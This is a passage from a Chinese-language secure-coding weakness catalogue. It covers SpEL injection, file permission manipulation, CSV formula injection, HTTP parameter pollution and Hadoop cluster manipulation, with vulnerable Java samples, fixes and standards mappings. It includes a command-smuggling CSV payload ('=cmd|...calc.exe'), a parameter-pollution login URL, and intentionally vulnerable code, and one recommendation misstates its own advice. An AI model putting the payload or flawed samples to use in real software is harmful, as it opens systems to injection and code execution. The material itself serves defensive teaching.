<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002550 CAT I, APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Expression-Language-Injection-Spring"><a href="#Expression-Language-Injection-Spring" class="headerlink" title="Expression Language Injection: Spring"></a>Expression Language Injection: Spring</h4><h5 id="ABSTRACT-278"><a href="#ABSTRACT-278" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>计算未验证的 SpEL 表达式可能导致执行远程代码。</p>
<h5 id="EXPLANATION-279"><a href="#EXPLANATION-279" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Spring 表达式语言（简写为 SpEL）是一种功能强大的表达式语言，支持在运行时查询和处理对象图。该语言的语法与统一 EL 类似，但提供了更多功能，尤其是方法调用和基本字符串模板化功能。 允许计算未验证的表达式将允许攻击者执行任意代码。</p>
<p>示例 1：应用程序使用受用户控制的未验证数据创建和计算 SpEL 表达式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String expression = request.getParameter(&quot;input&quot;);</span><br><span class="line"></span><br><span class="line">SpelExpressionParser parser = new SpelExpressionParser();</span><br><span class="line"></span><br><span class="line">SpelExpression expr = parser.parseRaw(expression);</span><br></pre></td></tr></table></figure>
<p>示例 2：应用程序在执行双重 SpEL 计算的 Spring 标记中使用受用户控制的未验证数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;spring:message text=&quot;&quot; code=&quot;$&#123;param[&apos;message&apos;]&#125;&quot;&gt;&lt;/spring:message&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-278"><a href="#RECOMMENDATIONS-278" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>SpEL 表达式应被视作代码，因此不应允许用户提交要在应用程序上下文中运行的任意代码。所以，用户控制的字符串不应解析为 SpEL 表达式。如果需要，开发人员应使用白名单仔细过滤并验证用户控制的表达式并仅允许所需的字符和表达式。</p>
<h5 id="REFERENCES-277"><a href="#REFERENCES-277" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Dan Amodio Remote Code with Expression Language Injection</p>
<p>[2] Expression Language Injection OWASP</p>
<p>[3] CVE-2011-2730 Red Hat</p>
<p>[4] INPUT-1: Validate inputs Oracle</p>
<p>[5] Standards Mapping - Common Weakness Enumeration CWE ID 94, CWE ID 95</p>
<p>[6] Standards Mapping - FIPS200 SI</p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[19] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 094</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="File-Permission-Manipulation"><a href="#File-Permission-Manipulation" class="headerlink" title="File Permission Manipulation"></a>File Permission Manipulation</h4><h5 id="ABSTRACT-279"><a href="#ABSTRACT-279" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>允许用户输入直接更改文件权限会导致攻击者能够访问其他受保护的系统资源。</p>
<h5 id="EXPLANATION-280"><a href="#EXPLANATION-280" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当满足以下任一条件时，就会产生 file permission manipulation 错误：</p>
<ol>
<li><p>攻击者能够指定在 file system 中修改权限的操作所使用的路径。</p>
</li>
<li><p>攻击者能够指定 file system 上的操作所分配的权限。</p>
</li>
</ol>
<p>示例 1：以下代码使用来自系统属性的输入来设置默认权限掩码。如果攻击者更改了系统属性，则他们可以使用该程序获得该程序所处理文件的访问权限。如果程序还容易受路径篡改攻击，那么攻击者可能会利用这一漏洞访问系统中的任意文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  String permissionMask = System.getProperty(&quot;defaultFileMask&quot;);</span><br><span class="line"></span><br><span class="line">  Path filePath = userFile.toPath();</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  Set&lt;PosixFilePermission&gt; perms = PosixFilePermissions.fromString(permissionMask);</span><br><span class="line"></span><br><span class="line">  Files.setPosixFilePermissions(filePath, perms);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-279"><a href="#RECOMMENDATIONS-279" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>防止此类文件权限操纵的最佳方式是允许用户设置文件权限。但是，如果必须确保用户能够指定文件的权限，则应该使用一种间接方法：即创建一个允许用户进行指定的合法文件权限的列表，并且仅允许用户从列表中进行选择。通过这种方式，用户提供的输入将绝对不会直接用于指定文件权限。</p>
<p>示例 2：以下代码使用了一种间接方法以验证来自系统属性的输入（应设置默认权限掩码）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  String permissionMask = System.getProperty(&quot;defaultFileMask&quot;);</span><br><span class="line"></span><br><span class="line">  Path filePath = userFile.toPath();</span><br><span class="line"></span><br><span class="line">  String[] validPermissions = &#123;&quot;r--------&quot;, &quot;r--r-----&quot;&#125;;</span><br><span class="line"></span><br><span class="line">  for (String validPermission : validPermissions)&#123;</span><br><span class="line"></span><br><span class="line">    if (permissionMask.equals(validPermission)&#123;</span><br><span class="line"></span><br><span class="line">      Set&lt;PosixFilePermission&gt; perms = PosixFilePermissions.fromString(validPermission);</span><br><span class="line"></span><br><span class="line">      Files.setPosixFilePermissions(filePath, perms);</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>事实上，在以上代码中，我们永远不会用到来自系统属性的用户输入。相反，我们会将其与指定的有效权限掩码进行比较，然后用于权限中。这可以防止用于比较相等性的 API 包含 bug，该 bug 会通过如空字节注入等方式允许绕开。</p>
<h5 id="REFERENCES-278"><a href="#REFERENCES-278" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] FIO01-J. Create files with appropriate access permissions CERT</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 264, CWE ID 732</p>
<p>[4] Standards Mapping - FIPS200 AC</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A2 Broken Access Control</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.2</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[14] Standards Mapping - SANS Top 25 2009 Porous Defenses - CWE ID 732</p>
<p>[15] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 732</p>
<p>[16] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 732</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[20] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Formula-Injection"><a href="#Formula-Injection" class="headerlink" title="Formula Injection"></a>Formula Injection</h4><h5 id="ABSTRACT-280"><a href="#ABSTRACT-280" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>攻击者可能会控制写入到电子表格的数据，借此让用户打开某些电子表格处理器上的文件。</p>
<h5 id="EXPLANATION-281"><a href="#EXPLANATION-281" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>常用电子表格处理器（如 Apache OpenOffice Calc 和 Microsoft Office Excel）支持的公式运算非常强大，这可能会使攻击者控制电子表格而在底层系统上运行任意命令或在电子表格上泄漏敏感信息。</p>
<p>例如，攻击者可能在 CSV 字段中注入以下负载：=cmd|’/C calc.exe’!Z0。如果打开电子表格的用户信任文档来源，他/她可能会接受电子表格处理器显示的所有安全提示，并让负载（本例中是打开 Windows 计算器）在其系统上运行。</p>
<p>示例：以下示例展示了使用未经检查的用户控制数据生成 CSV 响应的 Spring 控制器：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/api/service.csv&quot;)</span><br><span class="line"></span><br><span class="line">public ResponseEntity&lt;String&gt; service(@RequestParam(&quot;name&quot;) String name) &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    HttpHeaders responseHeaders = new HttpHeaders();</span><br><span class="line"></span><br><span class="line">    responseHeaders.add(&quot;Content-Type&quot;, &quot;application/csv; charset=utf-8&quot;);</span><br><span class="line"></span><br><span class="line">    responseHeaders.add(&quot;Content-Disposition&quot;, &quot;attachment;filename=file.csv&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    String data = generateCSVFor(name);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    return new ResponseEntity&lt;&gt;(data, responseHeaders, HttpStatus.OK);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-280"><a href="#RECOMMENDATIONS-280" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>防止注入攻击的最佳方法是采用一些间接手段：创建一份用户可以指定的合法值列表，并且规定用户只能从该列表中进行选择。通过这种方法，用户就不能直接由自己来指定资源的名称了。</p>
<p>但在某些情况下，这种方法并不可行，因为这样一份合法资源名的列表过于庞大、难以跟踪。因此，程序员通常在这种情况下采用黑名单的办法。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。但是，任何这样一份黑名单都不可能是完整的，而且将随着时间的推移而过时。更好的方法是创建一份白名单，允许其中的字符出现在资源名称中，且只接受完全由这些被认可的字符组成的输入。</p>
<p>对于公式注入，最好将字母数字字符列入字符集的白名单。如果此方法不可行，至少要将以下字符列入黑名单：=、+、- 和 @。</p>
<h5 id="REFERENCES-279"><a href="#REFERENCES-279" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Formula Injection Pentest Magazine</p>
<p>[2] Comma Separated Vulnerabilities Context</p>
<p>[3] INPUT-1: Validate inputs Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 74</p>
<p>[5] Standards Mapping - FIPS200 SI</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3600 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3600 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3600 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3600 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3600 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3600 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3600 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="HTTP-Parameter-Pollution"><a href="#HTTP-Parameter-Pollution" class="headerlink" title="HTTP Parameter Pollution"></a>HTTP Parameter Pollution</h4><h5 id="ABSTRACT-281"><a href="#ABSTRACT-281" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果在 URL 中加入未验证的输入，可能会让攻击者重写请求参数的值。攻击者可能会重写现有的参数值、注入新的参数或利用直接得到的变量。</p>
<h5 id="EXPLANATION-282"><a href="#EXPLANATION-282" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>HTTP Parameter Pollution (HPP) 攻击包含将编码的查询字符串分隔符注入其他现有的参数中。如果 Web 应用程序没有正确地检查用户输入，恶意用户可能会破坏应用程序的逻辑，进行客户端侧或服务器侧攻击。如果再向 Web 应用程序提交参数，并且如果这些参数与现有参数的名称相同，则 Web 应用程序可能会有下列一种反应：</p>
<p>它可能只从第一个参数中提取数据</p>
<p>它可能从最后一个参数中提取数据</p>
<p>它可能从所有参数中提取数据并把它们连接起来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Technology/HTTP back-end  | Overall Parsing Result  | Example               |</span><br><span class="line"></span><br><span class="line">ASP.NET/IIS  | All occurrences of the specific parameter | par1=val1|val2   |</span><br><span class="line"></span><br><span class="line">ASP/IIS     | All occurrences of the specific parameter | par1=val1|val2    |</span><br><span class="line"></span><br><span class="line">PHP/Apache    | Last occurrence                           | par1=val2        |</span><br><span class="line"></span><br><span class="line">JSP Servlet/Apache Tomcat | First occurrence              | par1=val1        |</span><br><span class="line"></span><br><span class="line">JSP Servlet/Oracle Application Server 10g | First occurrence| par1=val1        |</span><br><span class="line"></span><br><span class="line">IBM HTTP Server   | First occurrence                          | par1=val1        |</span><br><span class="line"></span><br><span class="line">mod_perl/Apache  | Becomes an array                          | ARRAY(0x8b9059c) |</span><br></pre></td></tr></table></figure>
<p>例 1：根据应用程序服务器和应用程序自身的逻辑，下列请求可能造成与身份验证系统的混淆，使攻击者能模拟别的用户。<a href="http://www.server.com/login.php?name=alice&amp;name=hacker" target="_blank" rel="noopener">http://www.server.com/login.php?name=alice&amp;name=hacker</a></p>
<p>例 2：下列代码使用来自于 HTTP 请求的输入来呈现两个超链接。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">String lang = request.getParameter(&quot;lang&quot;);</span><br><span class="line"></span><br><span class="line">GetMethod get = new GetMethod(&quot;http://www.host.com&quot;);</span><br><span class="line"></span><br><span class="line">get.setQueryString(&quot;lang=&quot; + lang + &quot;&amp;poll_id=&quot; + poll_id);</span><br><span class="line"></span><br><span class="line">get.execute();</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL: http://www.host.com?poll_id=4567</span><br><span class="line"></span><br><span class="line">链接 1：&lt;a href=“http://www.host.com/vote.php?lang=en&amp;poll_id=4567”&gt;英语&lt;a&gt;</span><br><span class="line"></span><br><span class="line">链接 2：&lt;a href=“http://www.host.com/vote.php?lang=es&amp;poll_id=4567”&gt;西班牙语&lt;a&gt;</span><br></pre></td></tr></table></figure>
<p>程序员尚未考虑下面这种可能性：攻击者可能会提供一个 lang（例如 en&amp;poll_id=1），然后攻击者将可以随意更改该 poll_id。</p>
<h5 id="RECOMMENDATIONS-281"><a href="#RECOMMENDATIONS-281" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在编译 URL 时，未经验证的用户输入应过滤掉多余的参数（删除“&amp;”字符）。</p>
<h5 id="REFERENCES-280"><a href="#REFERENCES-280" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] HTTP Parameter Pollution Luca Carettoni, Independent Researcher &amp; Stefano Di Paola, MindedSecurity</p>
<p>[2] HTTP Parameter Pollution Vulnerabilities in Web Applications Marco `embyte’ Balduzzi</p>
<p>[3] INPUT-1: Validate inputs Oracle</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 235</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[17] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
<h4 id="Hadoop-Cluster-Manipulation"><a href="#Hadoop-Cluster-Manipulation" class="headerlink" title="Hadoop Cluster Manipulation"></a>Hadoop Cluster Manipulation</h4><h5 id="ABSTRACT-282"><a href="#ABSTRACT-282" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该程序允许攻击者控制在其上运行客户端应用程序的 Hadoop 群集的核心组件。</p>
<h5 id="EXPLANATION-283"><a href="#EXPLANATION-283" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Hadoop cluster control 错误在以下情况下发生：</p>
<ul>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据被 NameNode、DataNode、JobTraker 等 Hadoop 群集核心组件用来更改群集的状态。</p>
</li>
</ul>
<p>Hadoop 群集是一种有害环境。当用来防止对群集节点未经授权访问的安全配置设置不当时，攻击可能会乘机控制基础设施。这导致了由 Hadoop 群集提供的任何数据遭到篡改的可能性。</p>
<p>例 1：下列代码是典型客户端应用程序中提交的 Job，其输入来自 Hadoop 群集中主计算机的命令行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public static void run(String args[]) throws IOException &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  String path = &quot;/path/to/a/file&quot;;</span><br><span class="line"></span><br><span class="line">  DFSclient client = new DFSClient(arg[1], new Configuration());</span><br><span class="line"></span><br><span class="line">  ClientProtocol nNode = client.getNameNode();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  /* This sets the ownership of a file pointed by the path to a user identified</span><br><span class="line"></span><br><span class="line">   * by command line arguments.</span><br><span class="line"></span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">  nNode.setOwner(path, args[2], args[3]);</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-282"><a href="#RECOMMENDATIONS-282" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>对来自不可信任的数据源的数据进行验证。在这种情况下，客户端应用程序运行所使用的 Hadoop 群集应被看作不可信任的数据源。因此，命令行参数、配置文件和存储在 HDFS 上的数据在被应用程序使用前，应根据一个包含已知可接受值的白名单进行验证。 例 2：重新回到例 1：我们可以根据一个已知用户名列表来验证提供的用户名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public static void run(String args[]) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">   String path = &quot;/path/to/a/file&quot;;</span><br><span class="line"></span><br><span class="line">   DFSclient client = new DFSClient(arg[1], new Configuration());</span><br><span class="line"></span><br><span class="line">   ClientProtocol nNode = client.getNameNode();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   /* This makes sure that the username is one of allowed in the whitelist.</span><br><span class="line"></span><br><span class="line">    * The same validation should be performed on the group name against args[3].</span><br><span class="line"></span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   String potentialUsers[] = &#123;harry, hermione, ron&#125;;</span><br><span class="line"></span><br><span class="line">   for (int i = 0; i &lt; potentialUsers.length; i++)&#123;</span><br><span class="line"></span><br><span class="line">       if (potentialUsers[i].equals(args[2]))&#123;</span><br><span class="line"></span><br><span class="line">           nNode.setOwner(path, args[2], args[3]);</span><br><span class="line"></span><br><span class="line">           break;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-281"><a href="#REFERENCES-281" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[3] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I</p>
<p>[10] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20)</p>
